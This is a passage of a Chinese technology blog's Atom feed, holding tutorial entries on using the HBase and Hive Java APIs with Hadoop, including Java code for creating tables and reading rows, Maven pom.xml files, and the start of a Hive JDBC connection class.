        &lt;h2 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h2&gt;&lt;p&gt;镜像可以从&lt;code&gt;MSDN&lt;/code&gt;中下载&lt;/p&gt;
&lt;p&gt;使用软碟通制作一个Windows Server2012的U
      
    
    </summary>
    
      <category term="其他" scheme="https://plutoacharon.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>Hbase Java API接口</title>
    <link href="https://plutoacharon.github.io/2019/11/28/Hbase-Java-API%E6%8E%A5%E5%8F%A3/"/>
    <id>https://plutoacharon.github.io/2019/11/28/Hbase-Java-API接口/</id>
    <published>2019-11-28T09:32:15.000Z</published>
    <updated>2019-11-28T09:33:55.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><pre><code>Hadoop2.8.0Hbase-1.4.9Centos7.2</code></pre><h2 id="Java代码"><a href="#Java代码" class="headerlink" title="Java代码"></a>Java代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pers.haohan.bigdata.hbase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.util.Bytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestHbaseAPI_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过java代码访问java数据库</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建配置对象,获取hbase连接</span></span><br><span class="line">        Configuration conf = HBaseConfiguration.create();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取hbase连接对象</span></span><br><span class="line">        <span class="comment">// classLoader : Thread.currentThread.getContextClassLoader  获取资源配置文件</span></span><br><span class="line">        <span class="comment">// classpath   : hbase-default.xml, hbase-site.xml</span></span><br><span class="line"></span><br><span class="line">        Connection connection = ConnectionFactory.createConnection(conf);</span><br><span class="line">        System.out.println(connection);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 获取操作对象 : Admin</span></span><br><span class="line">        <span class="comment">// Admin admin = new HBaseAdmin(connection);</span></span><br><span class="line">        Admin admin = connection.getAdmin();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 操作数据库: 判断数据库中是否存在某张表</span></span><br><span class="line">        <span class="comment">// 4-1. 判断命名空间</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            NamespaceDescriptor namespace = admin.getNamespaceDescriptor(<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamespaceNotFoundException e) &#123;</span><br><span class="line">            NamespaceDescriptor nd = NamespaceDescriptor.create(<span class="string">"test"</span>).build();</span><br><span class="line"></span><br><span class="line">            admin.createNamespace(nd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4-2. 判断hbase中是否存在某张表</span></span><br><span class="line">        TableName tableName = TableName.valueOf(<span class="string">"test:student"</span>);</span><br><span class="line">        <span class="keyword">boolean</span> flg = admin.tableExists(tableName);</span><br><span class="line">        System.out.println(flg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flg) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取指定的表对象</span></span><br><span class="line">            Table table = connection.getTable(tableName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查询数据</span></span><br><span class="line">            <span class="comment">// DDL(create,drop, alter), DML(update, insert, delete), DQL(select)</span></span><br><span class="line">            String rowkey = <span class="string">"1001"</span>;</span><br><span class="line">            <span class="comment">// string ==&gt; byte[]</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 字符编码</span></span><br><span class="line">            Get get = <span class="keyword">new</span> Get(Bytes.toBytes(rowkey));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查询结果</span></span><br><span class="line">            Result result = table.get(get);</span><br><span class="line">            <span class="keyword">boolean</span> empty = result.isEmpty();</span><br><span class="line">            System.out.println(<span class="string">"1001数据是否存在 = "</span> + !empty);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (empty) &#123;</span><br><span class="line">                <span class="comment">// 新增数据</span></span><br><span class="line">                Put put = <span class="keyword">new</span> Put(Bytes.toBytes(rowkey));</span><br><span class="line"></span><br><span class="line">                String family = <span class="string">"info"</span>;</span><br><span class="line">                String column = <span class="string">"name"</span>;</span><br><span class="line">                String val = <span class="string">"zhangsan"</span>;</span><br><span class="line"></span><br><span class="line">                put.addColumn(Bytes.toBytes(family), Bytes.toBytes(column), Bytes.toBytes(val));</span><br><span class="line"></span><br><span class="line">                table.put(put);</span><br><span class="line">                System.out.println(<span class="string">"增加数据"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 展示数据</span></span><br><span class="line">                <span class="keyword">for</span> (Cell cell : result.rawCells()) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 输出基本信息</span></span><br><span class="line">                    <span class="comment">// System.out.println("value = " + CellUtil.cloneValue(cell));</span></span><br><span class="line">                    <span class="comment">// value = [B@265adfad</span></span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">"value = "</span> + Bytes.toString(CellUtil.cloneValue(cell)));</span><br><span class="line">                    System.out.println(<span class="string">"raw = "</span> + Bytes.toString(CellUtil.cloneRow(cell)));</span><br><span class="line">                    System.out.println(<span class="string">"family = "</span> + Bytes.toString(CellUtil.cloneFamily(cell)));</span><br><span class="line">                    System.out.println(<span class="string">"column = "</span> + Bytes.toString(CellUtil.cloneQualifier(cell)));</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 创建表</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建表描述对象</span></span><br><span class="line">            HTableDescriptor td = <span class="keyword">new</span> HTableDescriptor(tableName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 增加列族</span></span><br><span class="line">            HColumnDescriptor cd = <span class="keyword">new</span> HColumnDescriptor(<span class="string">"info"</span>);</span><br><span class="line">            td.addFamily(cd);</span><br><span class="line"></span><br><span class="line">            admin.createTable(td);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"表格创建成功"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="XML文件"><a href="#XML文件" class="headerlink" title="XML文件"></a>XML文件</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>pers.haohan.bigdata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbasestudy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>hbase_mr<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;Hadoop2.8.0
Hbase-1.4.9
Centos7.2
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hbase" scheme="https://plutoacharon.github.io/tags/Hbase/"/>
    
  </entry>
  
  <entry>
    <title>Hive java API接口</title>
    <link href="https://plutoacharon.github.io/2019/11/28/Hive-java-API%E6%8E%A5%E5%8F%A3/"/>
    <id>https://plutoacharon.github.io/2019/11/28/Hive-java-API接口/</id>
    <published>2019-11-28T09:31:30.000Z</published>
    <updated>2019-11-28T09:31:46.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><pre><code>Hadoop2.8.0Hbase-1.4.9Centos7.2</code></pre><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>java_Hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java_Hadoop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>6<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>6<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-hdfs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-mapreduce-client-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-mapreduce-client-jobclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Java代码"><a href="#Java代码" class="headerlink" title="Java代码"></a>Java代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hive;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Hdfs.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileStatus;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hive</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">    <span class="keyword">static</span>   &#123;</span><br><span class="line"></span><br><span class="line">        conf.set(<span class="string">"fs.defaultFS"</span>, <span class="string">"172.18.74.236:9000"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    FileSystem fs = FileSystem.get(conf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 驱动，固定的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driverName = <span class="string">"org.apache.hive.jdbc.HiveDriver"</span>;</span><br><span class="line">    <span class="comment">// 默认就是10000端口，ip地址使用hive服务器的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url = <span class="string">"jdbc:hive2://172.18.74.236:10000/default"</span>;</span><br><span class="line">    <span class="comment">// hive连接的用户名和密码，默认就算是下面这两个</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String user = <span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password = <span class="string">"输入你的密码"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String today = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).format(<span class="keyword">new</span> Date());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 公共使用的变量</span></span><br><span 